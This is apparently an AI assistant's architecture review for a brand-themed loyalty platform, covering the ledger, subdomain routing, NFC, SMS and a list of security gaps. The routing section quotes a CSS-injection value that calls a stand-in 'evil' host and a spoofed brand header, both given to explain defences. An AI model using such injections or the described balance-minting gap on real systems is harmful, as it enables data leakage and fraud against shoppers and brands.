# Qumo — what we're actually building

## Context

Four build phases happened against a moving target. Your description above is
the clearest statement of the product so far, and reading it against the code
shows something worth saying plainly: **the engine is largely right, the shell
is largely wrong.** The expensive, hard-to-get-right parts — ledger, tenancy,
scan verification, auth — match what you described. The parts that are wrong
are all at the edges, and they are wrong because they were built for a
different product shape than the one you just described.

This is not a rewrite. It is an inversion of who the shopper thinks they are
dealing with, plus four things that were never built.

---

## 1. Is this what CIOS is for? No.

**CIOS** is a WhatsApp-first product-feedback platform: consumers check in
against products, answer conversational questions, brands read packaging and
product intelligence. The unit of value is *what a consumer tells you about a
product*.

**Qumo** is a purchase-loyalty platform: consumers prove a purchase, earn
value, spend it. The unit of value is *the transaction*.

They share nouns — Brand, Person, points, campaign — which is exactly why
building Qumo inside CIOS felt natural and is exactly why it now feels wrong.
Shared nouns are not a shared purpose.

**This changes an earlier decision.** The "own repo, shared database" plan was
justified by one thing: a shopper's Fair Cape balance should include both their
WhatsApp check-ins and their scans. Your description drops that — a shopper's
loyalty sits with the brand programme they opted into, not in a cross-product
wallet. With that gone, the shared database costs a lot and buys nothing.

**Recommendation: Qumo gets its own repo AND its own database.** Copy the
engine, share nothing at runtime. This also dissolves the problem I found
earlier — seven of the eight Qumo tables hold foreign keys into CIOS-owned
tables, which would have made a shared-database split painful and fragile.

---

## 2. What's built that matches (keep)

The whole earn spine exists and is sound:

| Piece | Where | Verdict |
|---|---|---|
| Immutable ledger, balance always `SUM(amount)` | `PointsTransaction`, `lib/consumer/wallet.ts` | Keep as-is. Correct, audited, no stored balance anywhere. |
| Multi-unit ledger (cents / points / stamps) | `LedgerUnit` enum | Keep. Both accrual models you described run on one table. |
| Single accrual path for every earn event | `lib/ledger/accrue.ts` | Keep. Stamp completion, coupon issue, budget cap all in one place. |
| Tenant isolation guard | `lib/db/tenant.ts` (`forBrand`) | Keep. This is what makes brand-scoped views safe. |
| Consumer read lens | `lib/consumer/scope.ts` (`forPerson`) | Keep. Read-only by design. |
| Phone + OTP auth, revocable sessions | `lib/consumer/otp.ts`, `session.ts` | Keep. Enumeration-resistant, sessions revocable. |
| Phone hashing + encryption | `lib/security/crypto.ts` | Keep. |
| Consent capture, versioned per channel | `lib/consumer/consent.ts` | Keep the mechanism; the copy needs rewriting for brand-first. |
| Receipt QR verification (signed + unsigned) | `lib/stores/payload.ts`, `receipt.ts` | Keep, **but see the security fix in §5**. |
| Unique single-use codes | `lib/packs/*` | Keep — this is the Campari sticker path. |
| Serializable transaction discipline | throughout | Keep. |

## 3. What was built on the wrong assumption

Honest list. Some of this is mine to own.

**a) The shopper sees "Qumo", not the brand.** Every shopper screen renders a
Qumo wordmark; the brand is a line of text inside a card. Your description has
it the other way round — the page *is* Chicken Licken's. **`Brand` has no
theming fields at all**: no logo, no colour, no subdomain. This is the single
biggest gap and it is the reskin requirement.

**b) The wallet is cross-brand.** `app/(shopper)/wallet/page.tsx` lists every
brand a shopper has a balance with, in one view. On a brand-specific site it
must show that brand only.

**c) The brand admin is CIOS's portal.** `/packs`, `/stores`, `/till` sit
inside the CIOS shell, with CIOS navigation, CIOS branding, and authentication
against CIOS's `User` table. This is precisely what you don't want.

**d) The till redemption flow was an over-build — my error.** You described
earning and never specified redemption. I inferred a two-phase spend-code flow
(shopper generates a code, cashier confirms on a logged-in device) and built
~700 lines, a schema, two screens and a test suite for it. It works, and it
assumes every till has a staffed Qumo login — a large operational ask for
franchises. **Parked per your answer.** Code stays, investment stops.

**e) Poster QR and slip QR are not the same thing, and only one is built.**
A slip QR is unique per transaction and *proves a purchase*. A poster QR is one
static code everyone scans and **proves nothing** — anyone walking past can
scan it. Today's code only models the "unique code" case. The fix is to give
them different jobs: **poster = join and opt in; slip or sticker = earn.**

**f) No opt-out.** You explicitly require withdrawal at any time. Consent is
captured and versioned; there is no path to withdraw it.

**g) No brand analytics.** Nothing shows a brand how a campaign is performing.

**h) No subscription anything.** No tier, no status, no cancellation
behaviour.

---

## 4. Target architecture

**One engine, two front doors, separate database.**

```
                    ┌─────────────────────────────┐
  chickenlicken.    │   Consumer web (multi-       │
  qumo.app     ────▶│   tenant by subdomain)       │
  campari.qumo.app  │   Brand-themed. Join, earn,  │
                    │   balance, opt out.          │
                    └──────────────┬──────────────┘
                                   │
                    ┌──────────────▼──────────────┐
                    │   Engine (shared lib)        │
                    │   ledger · accrual · tenancy │
                    │   auth · scan verification   │
                    └──────────────▲──────────────┘
                                   │
  app.qumo.app  ───▶┌──────────────┴──────────────┐
                    │   Brand console              │
                    │   promotions, analytics,     │
                    │   stores, billing            │
                    └─────────────────────────────┘
```

### Identity: shared Person, brand-scoped view

One `Person` per phone number. On `chickenlicken.qumo.app` they see Chicken
Licken and nothing else — enforced by `forBrand`/`forPerson`, which already
work. A shopper who later scans a Campari poster is **recognised by phone and
needs one tap to opt in**, not a second registration.

Brands never see across. Any cross-brand view is Qumo's alone and needs its own
lawful basis before it is ever built.

### Routing: subdomain per brand

*Built in Phase D.*

`{slug}.{root}`. One deployment, wildcard certificate, theme resolved from the
`Host` header in the proxy. Cookies scope naturally per subdomain, which means
a session on one brand's site does not automatically carry to another —
correct isolation, and the "one tap to opt in" recognition happens by phone at
sign-in rather than by a shared cookie. That is visible rather than theoretical:
sign in at `chicken-licken.…`, open `campari.…` in the same browser, and you
get a login page.

The apex is deliberately not a brand. Nor is `www`, nor any of a reserved list
(`app`, `admin`, `api`, `console`, …) that the brand console and the API will
want later — enforced at resolution rather than only at sign-up, so a row
written straight into the database still cannot claim one. A host that names no
brand is *rewritten* to `/no-brand`, which keeps the typed address in the bar
and, more importantly, means no page component runs without a brand.

**The root domain is configuration, not a constant** —
`NEXT_PUBLIC_QUMO_ROOT_DOMAIN`, read at build time because the proxy is
compiled into the Edge runtime. It defaults to `localhost`, which makes
`chicken-licken.localhost:3000` a working local brand host with no hosts-file
editing, and it means the still-open `qumo.app` / `qumo.co.za` question does
not block anything.

**How the brand reaches the Node side.** The proxy resolves the slug from the
`Host` header and sets `x-qumo-brand`, having *deleted* any incoming copy
first. That delete is the whole defence, not a belt-and-braces addition: a
header is the one part of a request a client fully controls, so a proxy that
merely added the header would let `X-Qumo-Brand: some-other-brand` select a
brand directly. Hostname parsing happens in exactly one place; the Node side
reads the header and never re-parses.

**What a brand actually gets to change.** Display name, tagline, logo, support
contact, and one accent colour with its ink. The accent overrides exactly two
CSS custom properties — the primary button and its text — because the shopper
stylesheet was already written against tokens. A brand owns the element that
says what happens next; it does not get to recolour type, ground or rules, so
it cannot make its own programme unreadable.

Colours are *matched* against `^#[0-9a-fA-F]{6}$`, not sanitised. The value
lands in a `style` attribute, and a CSS value is not text: `red;background:
url(https://evil/?c=` is a request off every shopper's phone. Logos must be
absolute `https` for the same reason plus a duller one — an `http` logo is a
mixed-content block that presents as a brand with no logo and nobody knowing
why. Invalid values degrade to absent, so a brand that pastes a malformed
colour gets the default black button rather than a broken page.

**Cross-brand scans are refused, and the refusal costs nothing.** A slip or
pack code opened on the wrong brand's host is rejected before anything is
awarded or burned, so the shopper can still use it at the right address. This
never protected the money — the award has always been driven by the code's own
`brandId` — but it makes "a page under brand X shows only brand X" true rather
than nearly true, and a shopper cannot tell those two apart by looking. The
check is a parameter on the engine call rather than a rule in the page, because
not every carrier asserts a brand: an SMS arrives with a code and a phone
number and no host at all, and the absence of a claim is not a mismatched one.

Custom domains (`rewards.chickenlicken.co.za`) become a later upsell without
changing the model.

**One thing deliberately not narrowed.** The data export still spans every
brand the shopper has joined, on every brand's site. It is generated for the
signed-in shopper and sent to them; narrowing it to the host would answer a
different question than a subject access request asks. The screen says so in
as many words.

### Two code types, two jobs

| | Poster / table-talker | Slip or sticker |
|---|---|---|
| Uniqueness | One static code | Unique per transaction or pack |
| Proves purchase | **No** | Yes |
| Job | Explain the promotion, sign up, opt in | Earn |
| Anti-abuse | Rate limit + optional capped welcome bonus | Signature, single-use constraint, freshness, velocity cap |

This is the distinction that makes the poster safe. A poster that awards value
is a poster that awards value to everyone who walks past it.

### Carriers: NFC taps alongside QR codes, never instead of them

An NFC tag holding an NDEF URI record is a URL carrier. Tap it and the phone
opens a URL — the engine cannot tell whether that URL arrived through a
camera or a radio, and should not care. So NFC is a *carrier* decision, not
an architectural one, and it splits into two very different tiers.

**Tier one needs no code at all.** Encode `https://qumo.co.za/s/K7M2-P9QR-3XVW`
onto a tag and it works today: same route, same single-use guarantee, same
ledger. A pack code is twelve characters from a 31-symbol alphabet, so the
whole URL sits comfortably under 60 bytes — fine even on the cheapest NTAG213
with 144 bytes of user memory. For a sticker on a box this is a packaging
choice and nothing else.

**Tier two changes what a poster can do**, which is the part worth the money.

The rule elsewhere in this document is that a poster proves nothing: it is
one static code, anyone walking past can scan it, so a poster can only be a
join-and-opt-in door. A secure tag breaks that. NTAG 424 DNA chips do "SUN"
— the chip computes a fresh CMAC on every single tap and appends it, along
with a counter that only ever increments, so the URL is different each time:

    /t?e=<encrypted uid + counter>&c=<cmac>

That buys two things a printed code fundamentally cannot:

- **Proof the physical tag was tapped.** A copied URL carries a stale
  counter and is refused, so it cannot be photographed, screenshotted or
  forwarded into a group chat.
- **Replay protection from the hardware**, rather than from a constraint we
  maintain.

So a table-talker at the till *can* honestly award a visit stamp, because
tapping proves presence. It still does not prove **purchase** — someone
standing near the counter taps without buying — so percent-of-spend stays on
the slip. But for "buy 10, get the 10th free", a tap the cashier watches is
good enough, and it is a far better moment than typing a code.

#### What each carrier actually proves

| Carrier | Proves presence | Proves purchase | May earn |
|---|---|---|---|
| Poster QR, or a plain tag | No | No | Join and opt in only |
| Pack code (printed or on a tag) | No | Weakly — they hold the pack | Yes, once per code |
| Till slip QR, signed | Yes | **Yes**, with the basket value | Yes, percent of spend |
| Secure NFC tap (SUN) | **Yes** | No | Yes, a visit stamp |
| SMS with a slip code | No | Yes, via the slip | Yes |

#### The rule that goes on every printed thing

**NFC is always additive. Every tag gets a QR beside it.**

iPhone XS and later read tags in the background with no app, but only with
the screen on and unlocked; older iPhones need the Control Centre widget;
plenty of people have NFC switched off entirely. For Chicken Licken's
customer base "my phone doesn't do that" is a common outcome, not an edge
case, and a shopper who cannot tap must never be stuck.

#### The operational risk that has no software fix

**A blank tag is rewritable by anyone with a phone.** Somebody walks into a
store, rewrites the table-talker to point at a phishing page, and the
brand's own shoppers get harvested. Production tags must have their lock
bits permanently set after encoding. That is a step in whoever does the
encoding and a line in what the console tells them — it cannot be enforced
from here, which is exactly why it needs writing down.

#### Implementation, when it lands

An `NfcTag` model holding the chip UID and its two AES keys encrypted, a
`/t` route that decrypts and verifies the CMAC, and a monotonic counter
check done as a compare-and-swap inside the same serializable transaction
everything else uses. The same shape as receipt signing, with the secret
living in silicon instead of a POS template.

### Subscription lifecycle

`Subscription` on the brand: status, period end, cancelled-at. On cancellation:
**earning freezes immediately, redemption is honoured for 60 days**, then the
programme closes. Enforced in the engine — a paused brand's scan routes refuse
to accrue — not in the UI, and stated in the shopper-facing terms up front so
nobody discovers it at a till.

### Channels: no-data access is a first-class path, not a fallback

A shopper with no data cannot scan a QR, so an SMS balance lookup solves the
*second* visit and not the first. The channel therefore has to do more than
report a balance.

**Own the logic, rent the bearer.** USSD and SMS are both webhook protocols:
an aggregator (Clickatell, Cellfind, Infobip, Africa's Talking, or a network
direct) holds the commercial relationship with the MNOs and posts each inbound
interaction to our server; we return the response. The aggregator sees what
Twilio sees when it delivers an OTP — text going somewhere. Menu logic, balance
derivation and analytics all stay in the engine, so **no data is given away.**

The only way data is lost is buying a *managed loyalty USSD product* where a
vendor runs the menus and holds balances. Do not buy that. Buy the pipe.
Aggregator rather than direct-to-network is a procurement shortcut — own short
codes mean per-network agreements, months of lead time and per-network monthly
rental — not an architectural concession.

**Identity already fits.** The network supplies the sender's MSISDN, and
identity is already keyed on `hashPhone()`. A balance query is
`MSISDN → hashPhone → Person → forPerson() → balance` — the same engine call
the web wallet makes. Web, SMS and USSD are three thin adapters over one
function, the shape `SmsClient` already uses.

**Security constraint, decided now:** a network-supplied MSISDN is a strong
identifier but not proof of consent, and sender IDs are spoofable on some
routes. **This channel is read-only.** Balance and history, yes. Spending,
opting out, or changing anything — no, or only behind a second factor. An
unknown number gets a join instruction, never a silently created account.

**SMS-to-earn, not just SMS-to-check.** The slip already carries a unique
transaction code. Printing it as text beside the QR —
*"No data? SMS `CL 8842315` to 33xxx"* — makes the receipt earn with no data,
no smartphone and no app. It is a second door onto `redeemReceipt()`, reusing
the same store code, single-use constraint and freshness window, not a second
system. For Chicken Licken's customer base this may matter more than the web
path. Registration works the same way: an unknown number gets the terms and
"reply YES to join", which is a better consent record than a tick box.

**SMS first, USSD later.** SMS also needs no data, is far cheaper and simpler
to provision, and request/response suits "check my balance". USSD earns its
place when an interactive menu is wanted and when the interaction must cost the
shopper nothing. Revisit after the pilot shows real usage.

**Commercial consequence:** this is the first feature with a marginal cost per
interaction, scaling with engagement — the opposite of the web path. It belongs
in the subscription pricing, and wants a per-brand monthly cap so one brand's
viral campaign does not eat everyone's margin.

*Named and not pursued:* WhatsApp is zero-rated on many SA bundles and more
capable than either. Same webhook shape, so it is a third adapter later rather
than a rebuild. Excluded for now because Qumo is staying clear of CIOS.

---

## 5. Security work that must land regardless

Found during the review, unchanged by any of the above.

1. **Unsigned stores are open, not degraded — critical.** For a store with no
   signing secret the shopper controls every field of the receipt URL. The
   unique constraint on `(storeId, externalTxnId)` blocks *reusing* a
   transaction id, not *choosing a fresh one*. There is no per-person cap on
   any scan path. Net: at an unsigned store a shopper can mint arbitrary
   balance. `VelocityBlock` exists and is consulted by CIOS's check-in flow but
   by neither Qumo scan path.
2. **No liability ceiling on issued value.** `Reward.maxCoupons` caps coupons;
   nothing caps cents or points. A brand running 5% cashback has unbounded
   exposure and no answer for their finance director.
3. **Rate limiting is per-process** (`lib/security/rate-limit.ts`, in-memory).
   On serverless the effective limit is limit × instances. Needs a shared store.
4. **The privacy notice promises data access, correction and deletion. None of
   it is implemented.** Same family as the missing opt-out.

---

## 6. Sequence

**Phase A — decide and document.** Commit this as `docs/qumo-architecture.md`.
No code.

**Phase B — engine hardening** (in this repo, before extraction; all of it
moves with the engine). **Pilot is Chicken Licken, so the slip path is what
gets hardened first**; Campari's sticker path follows once the first is right,
and shares every fix below:
- Velocity + per-person caps inside `applyAccrual`
- Liability caps on `EarnRule`
- Opt-out on `BrandMembership`, and a data export

**Phase C — extraction.** New repo, new database, copy the engine, drop the
CIOS-specific models. Nothing shared at runtime.

**Phase D — brand identity layer. Done.** `Brand.slug` as subdomain, theme
fields, host-based resolution in the proxy, and the shopper shell inverted so
the brand is the identity and Qumo is a footer line. Details above under
*Routing*. Proven by driving two brands in a browser, in both colour schemes,
plus 22 tests across host parsing, colour injection, header spoofing and
cross-brand scans.

**Phase E — brand console.** Own app, own auth, own nav. Promotions, stores,
poster and sticker codes, analytics, billing.

**Phase F — subscription lifecycle**, with the freeze-and-honour rule.

**Phase G — SMS channel.** Balance lookup and SMS-to-earn over an aggregator's
short code, as a thin adapter over the same engine calls. USSD only if the
pilot shows the demand.

**Phase H — NFC.** Tier one is already supported and needs only saying out
loud to whoever encodes the tags. Tier two waits on a decision about whether
tap-to-earn-a-stamp is wanted, because NTAG 424 DNA costs several times an
NTAG213 and brings a key-management story with it.

Redemption stays parked until a real brand tells us what their counter can do.
SSO is out of scope — phone+OTP is the lowest friction at a till, and social
login can be added later as another adapter without touching identity, since
a Person is keyed on phone rather than on a credential.

## Verification

Each phase carries its own tests, and the security fixes get an adversarial
test that reproduces the attack before fixing it — the way the two-device
session revocation was proven by actually driving two browsers, not by
asserting it in a unit test.

## Decided

- **Identity** — shared `Person` keyed on phone, brand-scoped view.
- **Routing** — subdomain per brand, `{slug}.qumo.app`.
- **Pilot** — Chicken Licken (slip) first, Campari (sticker) once it's right.
- **Redemption** — parked.
- **Cancellation** — freeze earning, honour redemption 60 days.
- **SSO** — out for now, addable later without touching identity.
- **Separation** — own repo *and* own database. Nothing shared with CIOS.
- **No-data channel** — build it ourselves over a rented bearer; SMS first.
- **NFC** — an additional way to scan, never a replacement. Plain tags work
  today; secure tags are their own phase.

## Open, and needing you

- **The consent copy is now the one place Qumo leads on a brand's page**, and
  it was not rewritten. It reads "I agree to Qumo storing my mobile number and
  my activity with the brands I scan" — still true, and arguably now more
  important to say plainly, but written for a page that led with Qumo. Whether
  it should also name the brand being joined depends on the operator vs
  responsible party decision below, and rewriting versioned consent copy twice
  is worse than rewriting it once. `WEB_CONSENT_VERSION` is untouched.

- **Which moment is NFC for?** The pack case is free today. A poster at the
  counter is where secure tags earn their cost. At the till the slip already
  does the job better, because it knows the basket value.

- **Operator vs responsible party** — still a legal question, now sharper: with
  brand-specific sites and per-brand opt-in, "the brand is responsible party,
  Qumo is operator" has become the natural reading. Needs confirming before the
  first real shopper.
- **An SMS aggregator account** — needed for Phase G, and the same account
  covers the OTP sending that Phase B's login already depends on. Worth pricing
  reverse-billed vs standard-rated early, since it sets the per-brand cap.
- **`qumo.app` is registered to someone else.** Unresolved from earlier, and
  subdomain-per-brand makes the domain load-bearing rather than cosmetic.
